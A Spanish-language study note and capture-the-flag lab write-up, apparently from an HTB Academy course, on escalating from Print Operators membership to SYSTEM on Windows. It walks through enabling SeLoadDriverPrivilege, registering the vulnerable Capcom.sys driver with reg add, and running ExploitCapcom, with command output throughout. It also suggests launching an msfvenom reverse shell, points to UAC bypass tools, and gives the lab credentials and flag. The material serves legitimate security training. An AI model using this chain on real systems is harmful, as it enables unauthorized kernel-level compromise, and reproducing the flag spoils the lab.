# Print Operators

[**Print Operators**](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators) es un grupo con privilegios elevados en un dominio: otorga entre otras cosas el privilegio `SeLoadDriverPrivilege` (capacidad de cargar drivers), permisos para gestionar impresoras en un Domain Controller, iniciar sesión localmente en un DC y apagarlo. El objetivo del flujo es: confirmar que la cuenta es miembro de Print Operators, habilitar `SeLoadDriverPrivilege`, instalar un driver vulnerable (Capcom.sys) y usar un exploit que aprovecha ese driver para conseguir una shell como SYSTEM.

---

## 1) Confirmar privilegios (`whoami /priv`)

Comando usado:

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled

```

**Qué muestra**: lista de privilegios de la cuenta actual. Columnas principales:

* `Privilege Name`: nombre interno del privilegio (ej. `SeLoadDriverPrivilege`).
* `Description`: descripción legible del privilegio.
* `State`: estado (`Enabled` o `Disabled`).


**Interpretación**: si `SeLoadDriverPrivilege` no aparece desde un contexto sin elevar, hay que **bypassear UAC** o conseguir un contexto elevado.

---

## 2) Bypass UAC / obtener contexto elevado

El texto menciona el repo ["UACMe" (lista de bypasses de UAC)](https://github.com/hfiref0x/UACME) o alternativamente abrir una consola administrativa desde GUI e introducir credenciales de la cuenta miembro de Print Operators. Tras hacerlo, al volver a ejecutar `whoami /priv`, `SeLoadDriverPrivilege` aparece pero inicialmente **Disabled** (luego se habilita con la PoC).

Salida de ejemplo tras acceso elevado:

```
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

---

## 3) Concepto: Capcom.sys y por qué explotar el driver

El driver `Capcom.sys` es conocido por permitir la ejecución de *shellcode* con privilegios SYSTEM cuando se carga y se explota adecuadamente. La estrategia es: usar el privilegio `SeLoadDriverPrivilege` para cargar `Capcom.sys` (malicioso/ vulnerable) y ejecutar exploit que realice *token stealing* o ejecute shellcode que derive en una shell SYSTEM.

---

## 4) Preparar la PoC que habilita el privilegio `SeLoadDriverPrivilege`

### Código (fragmento de includes)

El texto indica que debemos descargar la herramienta [PoC](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp) localmente y reemplazar/pegar los includes siguientes en el archivo `EnableSeLoadDriverPrivilege.cpp`:

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

**Explicación de los includes**:

* `<windows.h>`: API principal de Win32 (tipos, funciones, macros).
* `<assert.h>`: macros de aserción (debug).
* `<winternl.h>`: definiciones internas de NT para llamadas nativas (NT API) — útil si la PoC usa `NtLoadDriver` u otras NT calls.
* `<sddl.h>`: funciones para manejar SDDL (Security Descriptor Definition Language).
* `<stdio.h>`: I/O en C (printf, etc.).
* `"tchar.h"`: macros para compatibilidad Unicode/ANSI (`TCHAR`, `TEXT()` etc.).
  

`Nota`: La `PoC` habilita el privilegio y carga el controlador automáticamente.

### Compilar con Visual Studio (cl.exe)

Comando usado en el texto:

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

**Explicación de los flags**:

* `cl`: compilador MSVC (desde "Developer Command Prompt for VS2019").
* `/DUNICODE /D_UNICODE`: definen los símbolos `UNICODE` y `_UNICODE` para compilar la aplicación en modo Unicode — hace que macros como `TEXT()` y tipos `TCHAR` apunten a versiones wide-char (wchar_t).
* El resultado es un `EnableSeLoadDriverPrivilege.exe` compilado con entrada wide-char.

Salida de ejemplo que muestra el proceso de compilación y enlazado y el fichero `.exe` producido.

---

## 5) Añadir referencia al driver en el registro (HKCU)

Hay que añadir una referencia al driver en el registro porque Windows solo puede cargar un controlador si existe una entrada válida en el Registro que indique su ruta y tipo de servicio, y `NtLoadDriver` (la API usada para cargarlo) necesita precisamente esa clave para localizar el archivo `.sys` y montarlo en el kernel.

El texto indica descargar [`Capcom.sys`](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) y guardarlo en `C:\temp` (o `C:\Tools\Capcom.sys` en ejemplos) y luego **crear claves** bajo `HKCU\System\CurrentControlSet\CAPCOM` con `reg add`.

Comandos del texto:

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

**Explicación**:

* `reg add <ruta>`: añade una clave/valor al registro.
* `HKCU\System\CurrentControlSet\CAPCOM`: la ruta bajo el hive del usuario actual (HKEY_CURRENT_USER). Normalmente drivers se registran en HKLM, pero aquí se está añadiendo una entrada bajo HKCU para aprovechar `SeLoadDriverPrivilege` si el sistema lo permite.
* `/v ImagePath`: nombre del valor que contendrá la ruta al driver.
* `/t REG_SZ`: tipo de dato (cadena).
* `/d "\\??\\C:\Tools\Capcom.sys"`: datos — la ruta al driver. Obsérvese la doble barra invertida por el shell y la sintaxis `\??\`.
* Segunda línea crea el valor `Type` con valor DWORD `1` (habitualmente `SERVICE_KERNEL_DRIVER` equivale a `1`, indicando que la entrada es un driver kernel).

**¿Qué es `\??\`?**

* `\??\` es una [**NT Object Path**](https://learn.microsoft.com/es-es/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c) (ruta de objeto del espacio de nombres NT). El Win32 API acepta/parsea esa ruta y la resuelve a la ruta física correcta (por eso `\??\C:\Tools\Capcom.sys` apunta al archivo `C:\Tools\Capcom.sys`). El texto lo llama "odd syntax" y explica que la Win32 API la resuelve para localizar y cargar el driver.

---

## 6) Verificar que el driver NO esté cargado (DriverView)

Herramienta usada: [`DriverView.exe`](https://www.nirsoft.net/utils/driverview.html) de Nirsoft.

Comandos del texto:

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

**Explicación**:

* `DriverView.exe /stext drivers.txt`: exporta la lista de drivers a `drivers.txt` en formato texto.
* `Select-String -pattern Capcom`: en PowerShell, filtra `drivers.txt` buscando la cadena `Capcom`.
* Resultado esperado: ninguna coincidencia (driver no cargado aún).

---

## 7) Ejecutar la PoC para habilitar el privilegio

Comando:

```
EnableSeLoadDriverPrivilege.exe
```

Salida de ejemplo:

```
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

**Interpretación**: tras ejecutar la PoC, `SeLoadDriverPrivilege` aparece como `Enabled` — ahora la cuenta puede invocar `NtLoadDriver` para cargar el driver referenciado en el registro.

---

## 8) Verificar que Capcom aparece ahora listado

Repetir el volcado de drivers y filtrar por `Capcom`:

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Salida esperada:

```
Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

Esto confirma que el driver fue cargado.

---

## 9) Compilar y ejecutar `ExploitCapcom.exe` para escalar

Compilar [`ExploitCapcom.exe`](https://github.com/tandasat/ExploitCapcom)

Ejecutar el binario:

```
.\ExploitCapcom.exe
```

Salida de ejemplo del exploit:

```
[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

**Qué hace**: el exploit obtiene handle sobre el driver, coloca shellcode en memoria del kernel/espacio permitido, ejecuta shellcode, realiza *token stealing* y lanza una shell con privilegios `NT AUTHORITY\SYSTEM`.

---

## 10) Alternativa sin GUI — modificar `ExploitCapcom.cpp`

El texto indica que si no hay acceso GUI (no se puede abrir `cmd.exe` localmente), hay que modificar el código fuente `ExploitCapcom.cpp` (línea 292 en el ejemplo) para cambiar el programa que se lanza tras explotar el driver.

Fragmento:

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

**Explicación de la función `CreateProcess` usada**:

* `CreateProcess(lpApplicationName, lpCommandLine, ...)` crea un nuevo proceso.
* En este ejemplo, `CommandLine` contiene la ruta a `cmd.exe` (doble `\\` por literal en C).
* `PROCESS_INFORMATION` y `STARTUPINFO` administran los handles y opciones de inicio.
* `CREATE_NEW_CONSOLE` indica crear una nueva consola.

**Cambio sugerido en el texto**: reemplazar la línea

```c
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

por

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

y así lanzar un binario de *reverse shell* (`revshell.exe`) generado con `msfvenom`. El texto describe que se debe configurar un listener acorde al payload generado.

`Nota`: Si una `reverse shell` se bloquea por algún motivo, podemos intentar usar una `bind shell` o bien usar un payload que ejecute un binario en la víctima o que añada un usuario (exec / add user).

---

## 11) Automatizar: `EoPLoadDriver`

El texto menciona la herramienta [`EoPLoadDriver`](https://github.com/TarlogicSecurity/EoPLoadDriver/) que automatiza pasos: habilitar el privilegio, crear la clave de registro y ejecutar `NtLoadDriver`.

Ejemplo de ejecución:

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-...\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

**Interpretación**: `EoPLoadDriver` realiza automáticamente los pasos que antes hicimos manualmente (registro + habilitar) y ejecuta la llamada para cargar el driver. Luego se puede ejecutar `ExploitCapcom.exe` como se indicó antes.

---

## 12) Limpieza

Eliminar la clave que añadimos en HKCU:

```
reg delete HKCU\System\CurrentControlSet\Capcom
```

PowerShell/Prompt pedirá confirmación (Yes/No). El texto muestra la confirmación y la operación completada.

---



**Desde Windows 10 versión 1803**, `SeLoadDriverPrivilege` **ya no es explotable** de esta forma porque no es posible incluir referencias a claves de registro bajo `HKEY_CURRENT_USER` para este propósito. 

---

## Resumen 

1. Confirmar privilegios con `whoami /priv`.
2. Obtener contexto elevado (bypass UAC o autenticación GUI) hasta ver `SeLoadDriverPrivilege` disponible.
3. Descargar y preparar la PoC `EnableSeLoadDriverPrivilege.cpp` y compilar con `cl /DUNICODE /D_UNICODE`.
4. Añadir la clave en `HKCU\System\CurrentControlSet\CAPCOM` con `ImagePath` apuntando a `\??\C:\Tools\Capcom.sys` y `Type=1`.
5. Verificar driver no cargado con `DriverView.exe`.
6. Ejecutar `EnableSeLoadDriverPrivilege.exe` para habilitar el privilegio.
7. Verificar driver listado.
8. Ejecutar `ExploitCapcom.exe` para ejecutar shellcode y obtener shell como SYSTEM.
9. (Opcional) Modificar `ExploitCapcom.cpp` para lanzar binario distinto (por ejemplo `revshell.exe`) si no hay GUI.
10. (Opcional) Automatizar con `EoPLoadDriver`.
11. Limpiar con `reg delete HKCU\System\CurrentControlSet\Capcom`.
12. Tener en cuenta la limitación desde Windows 10 1803.

---


# Laboratorio

#### Siga los pasos de esta sección para escalar privilegios a SYSTEM y obtener el contenido del archivo flag.txt que se encuentra en el escritorio del administrador. Las herramientas necesarias para ambos métodos se encuentran en el directorio C:\Tools, o puede practicar compilándolas y subiéndolas usted mismo.


`IP`: `10.129.43.31`
`user`: `printsvc`
`password`: `HTB_@cademy_stdnt!`


Nos conectamos al host mediante `RDP`:
```bash
xfreerdp /v:10.129.43.31 /u:printsvc
```


<img width="1021" height="757" alt="image" src="https://github.com/user-attachments/assets/fc8b5ee6-722c-4f12-b70b-02b4705866b2" />


Abrimos una `powershell` y visualizamos los privilegios: 
```powershell
whoami /priv
```

<img width="1001" height="272" alt="image" src="https://github.com/user-attachments/assets/99c8979a-c582-4d1f-9e10-22fe5285c196" />

Vemos que `SeLoadDriverPrivilege` no aparece entre los privilegios que tenemos.

Visualizamos los grupos que están presentes en el token de nuestra sesión:


```powershell
whoami /groups
```

<img width="977" height="267" alt="image" src="https://github.com/user-attachments/assets/bbeeae2c-4059-42a1-a512-863f474f12b5" />

Confirmamos que pertenecemos al grupo `Print Operators` ya que aparece la línea `BUILTIN\Print Operators`.


Entonces, debido a que nuestra powershell no es elevada, es probable que nuestro token se encuentre limitado por `UAC`.

En este punto tenemos 2 alternativas:

- Utilizar el repo ["UACMe" (lista de bypasses de UAC)](https://github.com/hfiref0x/UACME)
- Abrir una consola administrativa desde GUI e introducir credenciales de la cuenta miembro de `Print Operators`.

Abrimos una powershell elevada y realizamos el comando `whoami /priv`:

<img width="850" height="365" alt="image" src="https://github.com/user-attachments/assets/082ec298-bc47-40f1-8242-30d3f478f220" />

Observamos que esta vez el privilegio `SeLoadDriverPrivilege` aparece `Disabled`. 


---


El siguiente paso es habilitar `SeLoadDriverPrivilege` con el archivo `EnableSeLoadDriverPrivilege.exe` de la `PoC` que proporciona el curso, el mismo además carga el driver.

Podríamos compilar el `.cpp` de la `PoC` pero procecemos a utilizar el `.exe` que tenemos en la máquina víctima.

Antes de ejecutar `EnableSeLoadDriverPrivilege.exe` debemos añadir referencia a `C:\Tools\Capcom.sys` en el registro:

<img width="1030" height="292" alt="image" src="https://github.com/user-attachments/assets/778a3446-d341-40b6-a1f3-b784a82446a5" />



Utilizamos los siguientes comandos:
```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```


<img width="986" height="117" alt="image" src="https://github.com/user-attachments/assets/854faead-dbdb-4f43-b4b6-670fc5957ec6" />


El paso siguiente es verificar que el driver no esté cargado con `DriverView.exe`
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

<img width="717" height="122" alt="image" src="https://github.com/user-attachments/assets/67af838e-3a76-4c98-b113-eecac9019a5a" />


Vemos que no está cargado porque no recibimos salida  


El siguiente paso es ejecutar la `PoC` para habilitar el privilegio:

```powershell
.\EnableSeLoadDriverPrivilege.exe
```
<img width="1018" height="199" alt="image" src="https://github.com/user-attachments/assets/8ba4f666-6fbe-478a-b52c-95a9da623e7a" />

<img width="597" height="256" alt="image" src="https://github.com/user-attachments/assets/0772d5c4-1ebc-4dda-ab4b-1bcf8fb3ca8b" />


`EnableSeLoadDriverPrivilege.exe` habilita `SeLoadDriverPrivilege` en el token del proceso que lo ejecuta. Esa habilitación no se propaga al token del PowerShell padre, por eso `whoami /priv` en la misma sesión de PowerShell sigue mostrando el privilegio como `Disabled`.

Repetir el volcado de drivers y filtrar por Capcom:
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

<img width="887" height="106" alt="image" src="https://github.com/user-attachments/assets/0a7e380d-2e5f-4e55-8d0e-cf3798f43ab3" />

Verificamos que el driver está cargado.

Cuando ejecutamos `EnableSeLoadDriverPrivilege.exe` se habilitó `SeLoadDriverPrivilege` en su token y luego llamó a `NtLoadDriver` desde el mismo proceso. Esto significa que el `exe` pudo habilitar el privilegio y la llamada a cargar el driver terminó con éxito.


El último paso sería compilar y ejecutar `ExploitCapcom.exe` para escalar privilegios. En este caso lo tenemos en `C:\Tools\`:

<img width="980" height="410" alt="image" src="https://github.com/user-attachments/assets/d994b66d-ffd1-4c05-8604-78dba3e2e6b1" />

El exploit `ExploitCapcom.exe` aprovecha la vulnerabilidad del driver `Capcom.sys` para ejecutar shellcode en modo kernel. Este código roba el token del proceso `SYSTEM` y lo asigna al proceso actual, otorgando una shell con privilegios `NT AUTHORITY\SYSTEM`.

Hemos escalado privilegios. Procedemos a mostrar el contenido de la flag para resolver el laboratorio:

<img width="1024" height="280" alt="image" src="https://github.com/user-attachments/assets/083d5f43-9bf8-471b-ab5f-9f39d2397851" />


`Flag`: `Pr1nt_0p3rat0rs_ftw!` 
